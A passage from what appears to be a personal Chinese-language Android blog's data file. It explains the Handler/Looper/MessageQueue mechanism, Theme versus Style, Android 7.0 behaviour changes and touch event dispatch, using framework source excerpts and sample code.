myLooper();//返回当前线程中对应的Looper，看看下面的Exception就知道了 if (me == null) { throw new RuntimeException(&quot;No Looper; Looper.prepare() wasn&#39;t called on this thread.&quot;); } final MessageQueue queue = me.mQueue; for (;;) { Message msg = queue.next(); // might block if (msg == null) { // No message indicates that the message queue is quitting. return; } try { msg.target.dispatchMessage(msg); } finally { //....省略 } } } 简单解释一下，也就是从消息队列中取出新的消息(msg)。交给msg.target.dispatchMessage(msg)这个trarget是个Handler来看下Handler里面的dispatchMessage方法 /** * Handle system messages here. */ public void dispatchMessage(Message msg) { if (msg.callback != null) { handleCallback(msg); } else { if (mCallback != null) { if (mCallback.handleMessage(msg)) { return; } } handleMessage(msg); } } 很明显是一个either or 的过程：Message这个类里面有个Runnable callback，如果这个message有callback的话，就执行这个runnable，否则执行handler.callBack.handleMessage。也就是我们经常用的 Handler handler = new Handler(){ @Override public void handleMessage(Message msg) { super.handleMessage(msg); } }; 这种内部类的形式了需要注意的是，Message最好不要用new，使用obtain方法获得，使用release方法释放，这里面有一个消息池的概念，我也不太理解。MessageQueue中没有太多的公共方法，其中next()方法会返回 message that should be processed. Will not return message that will be processed at future times.Message有一个long类型的变量Message.when，指的是这条消息最早可以被执行的时间，这个时间是基于SystemClock.uptimeMills()的。所以如果消息队列中没有一条message到达自己的可执行时间, 这个next()方法就会一直block。值得注意的是SystemClock.uptimeMills是基于CPU活动时间的，如果cpu处于sleep状态，这个sleep时间是不算的。所以如果你postDelayed了10s，假设cpu5s后开始休眠，10s后醒来，睡眠的这段时间是不算的。所以真正执行的时间可能还会往后延迟。 2. HandlerHandler基本上就做两件事 add message to the messageQueue of the Looper it’s associated with post() //把一条消息添加到所有可以被执行的消息的最后面，但在还没到时间的消息的前面 postDelayed()/postAtTime() //一个相对时间，一个绝对时间 postAtFrontOfQueue() // @piwai 插队行为，不要用 Handle message when this message doesn’t have callbackHandler的构造方法有7个,初始化时需要获得一个Looper常用的Handler handler = new Handler() 会创建一个基于当前线程的Looper的Handler,如果当前线程没有调用Looper.Prepare，会抛出一个异常，这些在源代码里都能看到。一些好用的构造函数 Handler (Looper.getMainLooper()) //往主线程的Looper的消息队列里发消息Hanlder(Looper.myLooper()) //往当前线程Looper的消息队列里添加消息 Choreographer使用Android studio时，经常会在Logcat里看到这样的 info: Skipped 60 frames! The application may be doing too much work on its main thread 这段log出自Chreographer ，大意就是主线程上做的事太多或者做了太多不该在主线程上做的事。至于为什么不要在主线程上做太多的事，来看看主线程都有哪些工作:System Events , Input Events ,Application callback ,Services, Alarm ,UI Drawing….另外，当屏幕内容发生变化，或者在Animation运行中，系统将会尝试每隔16ms来Draw a Frame。而这部分工作是由Choregrapher来完成的，而其内部是通过一个Handler来进行Frame更新的。 FrameHandler mHandler = new FrameHandler(Looper.myLooper()); Message msg = mHandler.obtainMessage(MSG_DO_FRAME); msg.setAsynchronous(true); mHandler.sendMessageAtTime(msg,nextFrameTime) private final class FrameHandler extends Handler { public FrameHandler(Looper looper) { super(looper); } @Override public void handleMessage(Message msg) { switch (msg.what) { case MSG_DO_FRAME: doFrame(System.nanoTime(), 0); break; case MSG_DO_SCHEDULE_VSYNC: doScheduleVsync(); break; case MSG_DO_SCHEDULE_CALLBACK: doScheduleCallback(msg.arg1); break; } } } 假设你在onMeasure,onLayout,onDraw这些方法中耽误主线程太多时间，Choregrapher将不能及时的更新Frame，哪怕你只耽误了1ms，系统也只能在16ms(大约)之后才能更新下一Frame。 3. 为了在开发中发现不应该在主线程中进行的操作(IO，网络)，可以使用StrictMode：if (BuildConfig.DEBUG) { StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder() .detectDiskReads() .detectDiskWrites() .detectNetwork() // or .detectAll() for all detectable problems .penaltyLog() .build()); StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder() .detectLeakedSqlLiteObjects() .detectLeakedClosableObjects() .penaltyLog() .penaltyDeath() .build()); } 4 .Activity LifeCycle Events Activity LifeCycle Events(startActivity(), finishi()) go out of your process through Binder IPC to the ActivityManager //有时候startActivity启动的Activity不是自己Process的,比如调用系统相机这种 Then back on to your main queue in the form of lifeCycle callbacks(onCreate(),onDestory() et_al) // 异步，异步！ 最后回到文章开头的那个问题：Handler.postDelay会阻塞线程吗？答案在这里找到了postDelayed本身就是把一条消息推迟到相对时间多久之后。关键在Looper取出这条消息时，用的是 Message msg = queue.next(); // might block 注释已经暗示了可能会阻塞，看下next方法做了什么: Message next() { .....省略 for (;;) { if (nextPollTimeoutMillis != 0) { Binder.flushPendingCommands(); } nativePollOnce(ptr, nextPollTimeoutMillis); synchronized (this) { // Try to retrieve the next message. Return if found. final long now = SystemClock.uptimeMillis(); Message prevMsg = null; Message msg = mMessages; if (msg != null &amp;&amp; msg.target == null) { // Stalled by a barrier. Find the next asynchronous message in the queue. do { prevMsg = msg; msg = msg.next; } while (msg != null &amp;&amp; !msg.isAsynchronous()); } if (msg != null) { if (now &lt; msg.when) { // Next message is not ready. Set a timeout to wake up when it is ready. nextPollTimeoutMillis = (int) Math.min(msg.when - now, Integer.MAX_VALUE); } else { // Got a message. mBlocked = false; if (prevMsg != null) { prevMsg.next = msg.next; } else { mMessages = msg.next; } msg.next = null; msg.markInUse(); return msg; } } else { // No more messages. nextPollTimeoutMillis = -1; } } } //....省略部分 } 首先进来 调用了nativePollOnce(ptr,nextPollTimeoutMillis);这是个native方法，类似于线程的wait方法，不过使用了Native的方法会更加精准。可以认为是用native方法让这个queue.next的方法耗时延长了，所以return时返回的Message也就满足合适的时间。往下看 // Next message is not ready. Set a timeout to wake up when it is ready. nextPollTimeoutMillis = (int) Math.min(msg.when - now, Integer.MAX_VALUE); 但这里的堵塞并非占用CPU资源这基本是一个类似生产者消费者的模型，简单说如果在主线程的MessageQueue没有消息时，就会阻塞在loop的queue.next()方法里，这时候主线程会释放CPU资源进入休眠状态，直到有下个消息进来时候就会唤醒主线程，在2.2 版本以前，这套机制是用我们熟悉的线程的wait和notify 来实现的，之后的版本涉及到Linux pipe/epoll机制，通过往pipe管道写端写入数据来唤醒主线程工作。原理类似于I/O,读写是堵塞的，不占用CPU资源。 nativePollOnce(ptr, nextPollTimeoutMillis);函数的调用。线程会被阻塞在这个地方。这个native方法会调用到底层的JNI函数android_os_MessageQueue_nativePollOnce()，进一步调用c/c++层的nativeMessageQueue的pollOnce()函数，在这个函数中又会通过本线程在底层的Looper的pollOnce()函数，进而调用pollInner()函数。在pollInner()函数中会调用epoll_wait()函数(这个函数不堵塞)对应nativePollOnce的还有nativeWake，就是表明pipe写端有write事件发生，从而让epoll_wait()退出等待。 主线程（UI线程）执行到这一步就进入了死循环，不断地去拿消息队列里面的消息出来处理？那么问题来了1、UI线程一直在这个循环里跳不出来，主线程不会因为Looper.loop()里的死循环卡死吗，那还怎么执行其他的操作呢？ 在looper启动后，主线程上执行的任何代码都是被looper从消息队列里取出来执行的。也就是说主线程之后都是通过其他线程给它发消息来实现执行其他操作的。生命周期的回调也是如此的，系统服务ActivityManagerService通过Binder发送IPC调用给APP进程，App进程接到到调用后，通过App进程的Binder线程给主线程的消息队列插入一条消息来实现的。2、主线程是UI线程和用户交互的线程，优先级应该很高，主线程的死循环一直运行是不是会特别消耗CPU资源吗？App进程的其他线程怎么办？ 这基本是一个类似生产者消费者的模型，简单说如果在主线程的MessageQueue没有消息时，就会阻塞在loop的queue.next()方法里，这时候主线程会释放CPU资源进入休眠状态，直到有下个消息进来时候就会唤醒主线程，在2.2 版本以前，这套机制是用我们熟悉的线程的wait和notify 来实现的，之后的版本涉及到Linux pipe/epoll机制，通过往pipe管道写端写入数据来唤醒主线程工作。原理类似于I/O,读写是堵塞的，不占用CPU资源。 所以确实是blocked了。但这并不意味着从postDelayed(r,10)开始，接下来的10ms就真的完全堵塞了(queue.next阻塞)PostDelayed最终会调用到enqueMessage方法，看一下: synchronized (this) { if (mQuitting) { IllegalStateException e = new IllegalStateException( msg.target + &quot; sending message to a Handler on a dead thread&quot;); Log.w(TAG, e.getMessage(), e); msg.recycle(); return false; } msg.markInUse(); msg.when = when; Message p = mMessages; boolean needWake; if (p == null || when == 0 || when &lt; p.when) { // New head, wake up the event queue if blocked. msg.next = p; mMessages = msg; needWake = mBlocked; } else { // Inserted within the middle of the queue. Usually we don&#39;t have to wake // up the event queue unless there is a barrier at the head of the queue // and the message is the earliest asynchronous message in the queue. needWake = mBlocked &amp;&amp; p.target == null &amp;&amp; msg.isAsynchronous(); Message prev; for (;;) { prev = p; p = p.next; if (p == null || when &lt; p.when) { break; } if (needWake &amp;&amp; p.isAsynchronous()) { needWake = false; } } msg.next = p; // invariant: p == prev.next prev.next = msg; } // We can assume mPtr != 0 because mQuitting is false. if (needWake) { nativeWake(mPtr); } } 注意nativeWake方法，在满足一定情况下会唤醒线程总结一下就是postDelayed确实调用了阻塞线程的方法，但一旦消息队列前面插入了可执行的message，会调用唤醒线程的方法。这些大部分在MessageQueue这个class中，看一下基本都能明白。 回顾一下整个过程:主线程作为一个Thread，持有一个Looper对象，Looper持有一个MessageQueue的消息队列，并一个一个地从中取出满足执行时间条件的Message，执行Messgae的callback或者交给Handler的handleMessage去处理。 5. update MessageQueue里面有个IdleHandler,可以在消息队列空了时候安插一些事情去做，Glide用了这个特性，在主线程不那么忙的时候做了一些事 nativePoolOnce能够挂起主线程和唤醒主线程的原理是使用了linux的管道： 以下文字出自Android应用程序消息处理机制（Looper、Handler）分析 管道是Linux系统中的一种进程间通信机制，具体可以参考前面一篇文章Android学习启动篇推荐的一本书《Linux内核源代码情景分析》中的第6章–传统的Uinx进程间通信。简单来说，管道就是一个文件，在管道的两端，分别是两个打开文件文件描述符，这两个打开文件描述符都是对应同一个文件，其中一个是用来读的，别一个是用来写的，一般的使用方式就是，一个线程通过读文件描述符中来读管道的内容，当管道没有内容时，这个线程就会进入等待状态，而另外一个线程通过写文件描述符来向管道中写入内容，写入内容的时候，如果另一端正有线程正在等待管道中的内容，那么这个线程就会被唤醒。这个等待和唤醒的操作是如何进行的呢，这就要借助Linux系统中的epoll机制了。 Linux系统中的epoll机制为处理大批量句柄而作了改进的poll，是Linux下多路复用IO接口select/poll的增强版本，它能显著减少程序在大量并发连接中只有少量活跃的情况下的系统CPU利用率。但是这里我们其实只需要监控的IO接口只有mWakeReadPipeFd一个，即前面我们所创建的管道的读端，为什么还需要用到epoll呢？有点用牛刀来杀鸡的味道。其实不然，这个Looper类是非常强大的，它除了监控内部所创建的管道接口之外，还提供了addFd接口供外界面调用，外界可以通过这个接口把自己想要监控的IO事件一并加入到这个Looper对象中去，当所有这些被监控的IO接口上面有事件发生时，就会唤醒相应的线程来处理，不过这里我们只关心刚才所创建的管道的IO事件的发生。 有一个开发者永远不应该主动调用的方法：纵观整个Android系统，Lopper的这个方法只在两处被调用。 /** * Initialize the current thread as a looper, marking it as an * application&#39;s main looper. The main looper for your application * is created by the Android environment, so you should never need * to call this function yourself. See also: {@link #prepare()} */ public static void prepareMainLooper() { prepare(false); synchronized (Looper.class) { if (sMainLooper != null) { throw new IllegalStateException(&quot;The main Looper has already been prepared.&quot;); } sMainLooper = myLooper(); } } android.app.ActivityThread中和com.android.server.SystemServer中分别调用了这个方法，言下之意systemServer虽然跑在app_process进程中，但其实也还是有一个looper的循环模型的。 KeyEvent不是推到handler queue的InputEvent有2个子类：KeyEvent和MotionEvent，其中KeyEvent表示键盘事件，而MotionEvent表示点击事件。BlockCanary有些事情是拿不到的 //这种是走handler的 at android.os.Handler.handleCallback(Handler.java:751) at android.os.Handler.dispatchMessage(Handler.java:95) at android.os.Looper.loop(Looper.java:154) at android.app.ActivityThread.main(ActivityThread.java:6119) at java.lang.reflect.Method.invoke(Method.java:-1) // 这种就不走handler at android.view.ViewRootImpl$WindowInputEventReceiver.onInputEvent(ViewRootImpl.java:6349) at android.view.InputEventReceiver.dispatchInputEvent(InputEventReceiver.java:185) at android.os.MessageQueue.nativePollOnce(MessageQueue.java:-1) at android.os.MessageQueue.next(MessageQueue.java:323) at android.os.Looper.loop(Looper.java:136) AndroidPerformanceMonitor(BlockCanary)的缺陷,不能检测触控事件处理的blocknativePollOnce直接调用了android.view.InputEventReceiver.dispatchInputEvent。原因在这一段代码 // Called from native code. //直接由native端调用 @SuppressWarnings(&quot;unused&quot;) private void dispatchInputEvent(int seq, InputEvent event) { mSeqMap.put(event.getSequenceNumber(), seq); onInputEvent(event); } cpp层在这个文件里 env-&gt;CallVoidMethod(receiverObj.get(), gInputEventReceiverClassInfo.dispatchInputEvent, seq, inputEventObj, displayId); Looper.cpp利用epoll机制接收events,并调用callback回调的handleEvent方法. mMessageQueue-&gt;getLooper()-&gt;addFd(fd, 0, events, this, NULL); Reference Handler.postDelayed()是如何精确延迟指定时间的 How the Main Thread works 安卓中为什么主线程不会因为Looper中的死循环而卡死？","tags":[{"name":"Handler Message","slug":"Handler-Message","permalink":"https://haldir65.github.io/tags/Handler-Message/"}]},{"title":"Theme和Style的区别","date":"2016-10-10T19:35:32.000Z","path":"2016/10/10/theme-versus-style/","text":"认识Theme和Styles 重新看一遍Using Themes and styles without going crazy，大部分属于直接翻译 1. Styles1.1 首先，在layout文件中，Style可以将一些重复的，具有共性的属性提取出来&lt;View android:background= &quot;#ff0000&quot; /&gt; 变成 &lt;View style= &quot;@Style/MyStyle&quot; /&gt; &lt;Style name = &quot;MyStyle&quot;&gt; &lt;item name = &quot;android:background&quot;&gt;#ff0000&lt;/item&gt; &lt;/Style&gt; 这种形式，对于大量的具有相同属性的且具有共性的View，可以直接使用对应的Style，这能够让layout文件更加整洁。前提是确信layout文件中使用的View具有相同的属性。 1.2 Style InheritanceStyle可以继承，两种方式： 假设有parent style ，一种在name中使用前缀的方式指明parent，另一种在后面显式的声明parent &lt;style name = &quot;Parent&quot;/&gt; Explicit child &lt;style name = &quot;Child&quot; parent = &quot;Parent&quot;&gt; Implicit Child &lt;style name = &quot;Parent.Child&quot;/&gt; 同时使用两种方式时，默认使用Explicit Parent 为避免混淆，推荐使用Explicit Child且Child name不带前缀 View不能拥有两个Style,除了TextView及其子类，例如 &lt;TextView&gt; android:textColor = &quot;#ffffff&quot; style=&quot;@style/SomeStyle&quot; android:textAppearance = &quot;@style/MyText&quot; &lt;/TextView&gt; 如上所示，TextView中可以定义TextAppearance，后者包含了常见的textColor，textSize等attributes，而在一个View中可以同时定义两个Style。如果出现冲突，styles之间相同attributes的应用优先级为： android:textColor &gt;&gt; SomeStyle中的android:textColor&gt;&gt;MyText中的android:textColor 使用TextAppearance 时一定要有一个parent &lt;style name = &quot;MyText&quot; parent=&quot;TextAppearance.Appcompat&quot;&gt; &lt;item name = &quot;android:TextColor&quot;&gt;#F08&lt;/item&gt; &lt;/style&gt; 因为使用style时，系统将把style中定义的attribute和当前View的默认attribute融合起来，而TextView默认attribute 中什么也没有，造成textSize = 0的情况，所以务必选择parent，在parent style已经定义好大多数属性的情况下再去修改小部分属性将简单得多。TextAppearance可以在Theme中定义，也可以写在单一的TextView上。 2. Themes 在Android中，Theme名字以”Theme.”开头，查看源码会发现只是定义了一大堆color attributes 和Window attributes。Themes比Styles的作用范围更广，themes可以在Application,Activity层面管理Widget外观，Theme还可以实现夜间模式切换 来看如何定义一个Theme &lt;style name = &quot;Theme&quot;&gt; &lt;item name = android:statusBarColor&gt;#ff0000&lt;/item&gt; &lt;/style&gt; 回头看一下Style &lt;Style name = &quot;Style&quot;&gt; &lt;item name = &quot;android:background&quot;&gt;#ff0000&lt;/item&gt; &lt;/Style&gt; 语法看起来完全一样。 区别：styles中的属性被直接送到View的构造函数中，记得在自定义View时写的那些attrs吗，其实就是两个参数的构造函数中的AttributeSets Theme应用范围更广，定义的属性和Style也不尽相同。 两者之间有一些联系：例如Theme中可以定义default widget style，Style可以引用Theme中定义的属性(?attr:selectableItemBackground还记得吗) 上面提到了Theme中可以定义default widget style，具体做法无非就是这样: &lt;style name= &quot;MyTheme&quot; parent=&quot;Theme.AppCompat.Light&quot;&gt; &lt;item name=&quot;android:editTextStyle&quot;&gt;@style/MyEditTextStyle&lt;/item&gt; &lt;/style&gt; 所以，只要在AppTheme中点进去，找一下这个键对应的值就可以了 2.1 使用Theme 两种方式: 1.在Manifest中，例如 &lt;application android:theme=&quot;@style/Theme.AppCompat&quot; /&gt; 或者 &lt;activity android:theme=&quot;@style/Theme.AppCompat.Light&quot; /&gt; activty中Theme override Application的Theme 应用于View Lollipop开始引入View Theming的概念 &lt;Toolbar android:theme=&quot;@style/ThemeOverlay.AppCompat.Dark.ActionBar&quot; app:popupTheme=&quot;@style/ThemeOverlay.AppCompa.Light&quot;/&gt; 应用在View上的Theme将能够作用在该View及其所有的Children，这样做的好处在于没有必要专门为了一个View而去选择其他的Theme。 例如在Holo中有Holo.Light.DarkActionBar，为了专门适配ActionBar需要一个专门的Theme。目前看来主要应用在Toolbar上。 3 .墙裂推荐使用AppCompat 好处: Material on all devices ,记得以前听说AppCompat在21以上继承自Theme.Material。 Baseline themes/styles AppCompat 预设了一系列样式标准，只需要继承AppCompat，改动一小部分样式就能完成设计 Enable View theming pre-Lollipop 使用ColorPrimary , ColorAccent等attributes(backPorted by AppCompat)设置Widget样式 在Theme中可以定义默认的Widget样式，例如 &lt;style name=&quot;AppTheme&quot; parent = &quot;Theme.AppCompat&quot;&gt; &lt;item name=&quot;android:spinnerItemStyle&quot;&gt;@sytle/MySpinnerStyle&lt;/item&gt; &lt;/style&gt; 还可以更改默认样式： &lt;style name = &quot;AttrTheme&quot; parent =&quot;Theme.AppCompat&quot;&gt; &lt;item name =&quot;selectableItemBackground&quot;&gt;@drawable/bg&lt;/item&gt; &lt;/style&gt; &lt;Button android:background=?attr/selectableItemBackground&quot;/&gt; 这样就可以自定义点击时的Drawable了。 支持android:theme: API 7+(只应用于该View)，API 11+(View及其子View) View theming原本只是API 21才引入的概念，AppCompat实现了向前兼容 4 . ?attr的问题 ?android:attr/selectableItemBackground 一个个来解释： ? : we’re doing a theme lookup android: we’re looking up something within the android namespace attr/ : we’re looking for an attribute(可省略) selectableItemBackground: The name of the atribute we’re looking up 把attr/省略掉后变成 ?android:selectableItemBackground 效果完全一样 &lt;style name=&quot;MyTheme&quot;&gt; &lt;item name = &quot;android:colorPrimary&quot;&gt;@color/red&lt;/item&gt; &lt;/style&gt; 问题在于android:ColorPromary是Lollipop才引入的，解决方案 &lt;syle name = &quot;MyTheme&quot; parent=&quot;Theme.AppCompat&quot;&gt; &lt;item name = &quot;colorPrimary&quot;&gt;@color/red&lt;/item&gt; &lt;/syle&gt; 注意这里没有android: 前缀，AppCompat针对API21之前的版本定义了自己的一套资源。 再举个例子 在values/attrs.xml中 &lt;attr name:&quot;myAttribute&quot; format=&quot;dimension&quot;/&gt; 在values/themes.xml中 &lt;style name = &quot;MyTheme&quot; parent = &quot;Theme.AppCompat&quot;&gt; &lt;item name=&quot;myAttribute&quot;&gt;4dp&lt;/item&gt; 这就是实际使用的Theme &lt;/style&gt; 在values/styles.xml中 &lt;style name=&quot;MyStyle&quot;&gt; &lt;item name=&quot;android:padding&quot;&gt;?attr/myAttribute&lt;/item&gt; &lt;/style&gt; 实际操作中 在layout文件中，通过将一个长度，颜色定义为?attr的方式，就会去当前的Theme中寻找相对应的attribute，这就是黑夜模式切换的原理 要注意的是，所有非android nameSpace的attribute Name都是global的，所以如果两个library定义了相同的attribute Name，将无法编译通过。 Style可以通过?attr的方式引用Theme中的资源 5 .获取Themecontext.getTheme().resolveAttribute(R.attr.dialogTheme,outValue,true) 在View中 TypedArray a = context.obtainStyledAttributes(attrs,com.android.internal.R.styleable.ImageView,defStyleAttr,defStyleRes) int alpha = a.getInt( com.android.internal.R.styleable.ImageView_drawableAlpha,255) Activity有一个setTheme(int themeResId)方法，注意，这个方法并不是取代原先的Theme,只是在原有的Theme上apply了。所以这个命名不算太好。Activity内部会在onCreate()前调用setTheme(你写在manifest里面的Theme) 6. v21的问题在values/styles.xml中 &lt;style name=&quot;BaseToolbar&quot;/&gt; 在values-v21/styles.xml中 &lt;style name= &quot;BaseToolbar&quot;&gt; &lt;item name = &quot;android:elevation&quot;&gt;4dp&lt;/item&gt; &lt;/style&gt; elevation是21以上api才有的属性，lint会提示问题 这样，在values/styles.xml中 &lt;style name = &quot;Toolbar&quot; parent = &quot;BaseToolbar&quot;/&gt; lint就不会飙黄了，直接引用Toolbar即可 通过这种继承的方式能够在自己的Theme中使用统一的theme，针对不同的运行时版本确定最终运行的Theme。 7 . ThemeOverlayThemeOverlay.Material.Light ThemeOverlay.Material.Dark //etc ... 用于添加到现有的Theme上，例如Theme.Material.Light只包含color relevant to a light Theme，不会改变原有Theme的window Attributes。查看源码，只是完整的Theme中的一小部分attribute。 8. 常见错误 作为Theme中引用的style必须要有一个parent 例如 在AppTheme中 &lt;item name = &quot;android:editTextStyle&quot;&gt;@style/MyEditTextStyle&lt;/item&gt; &lt;style name= &quot;MyEditTextStyle&quot;&gt; &lt;item name= &quot;android:fontFamily&quot;&gt; sans-serif-medium &lt;/item&gt; &lt;/style&gt; 这样做的结果将是所有的EditText都会失去基本的属性 defStyleAttr vs defStyleRes 常见于 ObtainStyledAttributes(AttributeSet set,int []attrs, int defStyleAttr,int defStyleRes) 直接解释： defStyleAttr: The attr in your theme which points to the default style eg: R.attr.editTextStyle defStyleRes: The resource ID of the default style eg:R.style.Widget_Material_EditText ObtainStyledAttributes查找Value时读取的顺序如下 1. Value in the AttributeSet 2. Value in the explicit style 3. Default style specified in defStyleRes 4. Default style specified in defStyleAttr 5. Base value in this theme 注意最后一条，万一在manifests文件中出现这种东西 &lt;Style name = &quot;AppTheme&quot; parent = &quot;Theme.AppCompat&quot;&gt; &lt;item name = &quot;android:background&quot;&gt;...&lt;/item&gt; &lt;/Style&gt; 这意味着 Any View which doesn’t have a background set ,will use the theme’s value , SHIT! 9. 容易遇到的错误编译不通过的情况 Error retrieving parent for item: No resource found that matches the given name &#39;@android:style/TextAppearance.Holo.Widget.ActionBar.Title&#39; 10. 最后，一点好玩的Context themedContext = new ContextThemeWrapper(baseContext,R.style.MyTheme); View view = LayoutInflator.form(themedContext) .inflate(R.layout.some_layout,null); //或者 View view = new View(themedContext); //生成的View就会带有MyTheme中的属性，动态设置。 而这也是AppComPat对于API 21以下版本进行兼容的原理翻了一下文档：ContextThemeWrapper : Added in API level 1 这一点AppCompat的作者也在2014年的一篇 博客中提到了。 reference Daniel Lew View Constructor IO 2016","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"android 7.0一些新特性介绍及适配方案","date":"2016-10-08T03:02:26.000Z","path":"2016/10/08/android-7-0-new-features/","text":"Google I/O 2016上的What’s new in Android介绍的比较全面，MultiWindow、Notification、ConstraintLayout等都比较简单。这里拎出来开发者不得不注意的几点来介绍。 1. BackGround OptimizationCONNECTIVITY_CHANGE(很多应用喜欢在Manifest里注册这个BroadcastReceiver，导致网络变化时，一大堆应用都被唤醒，而ram中无法同时存在这么多process，系统不得不kill old process，由此导致memory thrashing) 同时被移除的还有NEW_PICTURE,NEW_VIDEO. 具体来说: 对于targeting N的应用，在manifest文件中声明 static broadcastReceiver，监听CONNECTIVITY_CHANGE将不会唤醒应用。如果应用正在运行，使用context.registerReceiver，将仍能够接受到broadcast。但不会被唤醒。 解决方案: 使用JobScheduler或firebase jobDispatcher。举个例子: public static final int MY_BACKGROUND_JOB = 0; public static void scheduleJob(Context context){ if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) { JobScheduler js = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE); JobInfo job = new JobInfo.Builder( MY_BACKGROUND_JOB, new ComponentName(context,MyJobService.class)). setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED). setRequiresCharging(true). build(); js.schedule(job); } } 对于NEW_PICTURE,NEW_VIDEO. 所有在7.0 Nuget以上设备运行的应用(无论是否 target N) 都不会收到这些broadcast。简单来说，fully deprecated !!! 解决方案：使用JobScheduler(可以监听contentProvider change)NEW_PICTURE的处理(这段代码只在API24以上存在，所以加了版本判断) public static void scheduleJob(Context context){ if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) { JobScheduler js = context.getSystemService(JobScheduler.class); JobInfo.Builder builder = new JobInfo.Builder( R.id.schedule_photo_jobs, new ComponentName(context,PhotoContentJob.class)); builder.addTriggerContentUri( new JobInfo.TriggerContentUri(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, JobInfo.TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS) ); js.schedule(builder.build()); } } 参考youtube上谷歌员工的演讲 2. 文件系统的权限更改(FileProvider) File storage permission change 简单来说就是Uri.fromFile(file://URI)不能再用了，需要使用FileProvider，这主要是为了6.0开始引进的permission model 考虑的，storage permission例如WRITE_EXTERNAL_STORAGE这种都已经属于Dangerous permission了。 一个常见的场景就是调用系统相机拍照，给Intent设置一个uri，在7.0上直接用Uri.FromFile会崩 需要通过FileProvider提供Uri,写了一个Demo，使用FileProvider传递文件给另一个App。 另一个需要注意的就是DownloadManager访问COLUMN_LOCAL_FILENAME会报错，这个不常见。 更新转眼Android 9都出来了，Android9中限制了私有函数的调用，就是反射不好用了。有一种使用unSafe操作规避的方式 参考 Docs youtube Andrioid 7.0适配心得 Android 7.0 Behavior Changes","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"安卓事件分发流程","date":"2016-10-06T23:32:30.000Z","path":"2016/10/06/touch-event-distribution/","text":"图1 默认情况下事件传递的路径 Touch事件始于ACTION_DOWN, 终止于ACTION_UP, 这其中可能会伴随着ACTION_MOVE,ACTION_CANCEL等等。 首先来关注ACTION_DOWN，用户触摸屏幕，MotionEvent开始传递： Activity.dispatchTouchEvent ViewGroup.dispatchTouchEvent ViewGroup.onInterceptTouchEvent …..中间省略n个视图层级 ….&gt;&gt;&gt; View.dispatchTouchEvent View.onTouchEvent ​ ….中间省略n个视图层级….&gt;&gt;&gt; ViewGroup.onTouchEvent Activity.onTouchEvent 这也就是本文最开始的图1内描述的内容，注意，在默认情况下(各个函数都返回super的情况下)才能将这个从上到下，再从下到上的循环走完整。这里讨论的还只是ACTION_DOWN。 接下来看ACTION_DOWN下发过程中各个函数返回值对于整个传递链走向的影响，我们在override这些函数的时候，返回值无非三种： true , false ,super return true：ACTION_DOWN事件分发到此结束(消费掉)，这里有一个要注意的是onInterceptTouchEvent,返回true表示该ViewGroup打算将事件拦截下来，底层View将接收到一个ACTION_CANCEL，事件传递给该ViewGroup的onTouchEvent return false: 对于dispatchTouchEvent，返回false表明不再向下分发，ACTION_DOWN发送到上一层ViewGroup(Activity)的OnTouchEvent；对于onInterceptTouchEvent,返回false表明该ViewGroup不打算拦截，继续下发，对于onTouchEvent，返回false，事件继续上传至上一层级ViewGroup的OnTouchEvent 。 return super : 完成整个传递链，就像图1中展示的一样。 图2 来自图解安卓事件分发机制 完美地解释了事件分发各个流程中返回值对于事件传递的影响。 图3 来自图解安卓事件分发机制 接下来看ACTION_DOWN时返回值对于后续ACTION_MOVE,ACTION_UP等传递路径的影响： 首先介绍概念： gesture = ACTION_DOWN+ a bounch of ACTIONS +ACTION_UP 一个gesture(手势)即从手指按下到手指离开这段过程中所有的事件的集合,swipe,click,fling等等 ACTION_DWON发生时，android将会在当前touch区域所有的View中确定一个Touch Target,后者将接管此次gesture中的所有ACTION_MOVE,ACTION_UP。（这样做有两点好处：1.一旦确定了Touch Target，系统将会把所有的后续事件全部传递到这个target为止，这就避免了复杂的view traversing，有助于提升性能; 2：传递链中第一个能够成为Touch Target的View将独立处理后续事件，不需要考虑其他View受到影响）。在在一个gesture开始时，OnTouchEvent（ACTION_DOWN）返回true,就意味着成为TouchTarget。借用简书作者的总结: ACTION_DOWN事件在哪个控件消费了（return true）， 那么ACTION_MOVE和ACTION_UP就会从上往下（通过dispatchTouchEvent）做事件分发往下传，就只会传到这个控件，不会继续往下传，如果ACTION_DOWN事件是在dispatchTouchEvent消费，那么事件到此为止停止传递，如果ACTION_DOWN事件是在onTouchEvent消费的，那么会把ACTION_MOVE或ACTION_UP事件传给该控件的onTouchEvent处理并结束传递。 这里可以看到，事件依旧是从上往下一直分发到TouchTarget这一层，只是在TouchTarget这一层被消费了，且不再往上传递(有助于性能提升)。父ViewGroup的dispatchTouchEvent和onInterceptTouchEvent依旧会先于TouchTarget接收到ACTION_MOVE等事件。所以此时如果父ViewGroup在onInterceptTouchEvent中返回true，父ViewGroup将取代原有的子View成为新的ViewTarget,后续事件(ACTION_MOVE等)将传递到该父ViewGroup中，而子View将收到ACTION_CANCEL(可以在这里做一些恢复状态的工作，比如从foucused变成unfocused)。举一个例子：在ScrollView(不是Android自带的那个)中放一个Button，ACTION_DOWN时，BUTTON表示可以处理ACTION_DOWN,因为这可能会是一次click，于是Button就成了TouchTarget，后续事件将不会传递到ScrollView中，ScrollView也就无法滑动。为解决这个问题，在ScrollView的onInterceptTouchEvent中，如果看到ACTION_DWON，返回false(点击事件对于滑动毫无意义)，但如果看到ACTION_MOVE(滑动事件),返回true并成为新的TouchTarget。注意是在OnInterceptTouchEvent中拦截而不是dispatchTouchEvent中拦截，后者会将事件传递到上层ViewGroup的onTouchEvent中。想想看，不去dispatch了、、、android这种Api起名还是可以的。 #onClick事件接下来看onClick和onLongClick，onTouchListener这类事件何时触发 首先是View的dispatchTouchEvent源码部分 case MotionEvent.ACTION_UP: boolean prepressed = (mPrivateFlags &amp; PFLAG_PREPRESSED) != 0; if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0 || prepressed) { // take focus if we don&#39;t have it already and we should in // touch mode. boolean focusTaken = false; if (isFocusable() &amp;&amp; isFocusableInTouchMode() &amp;&amp; !isFocused()) { 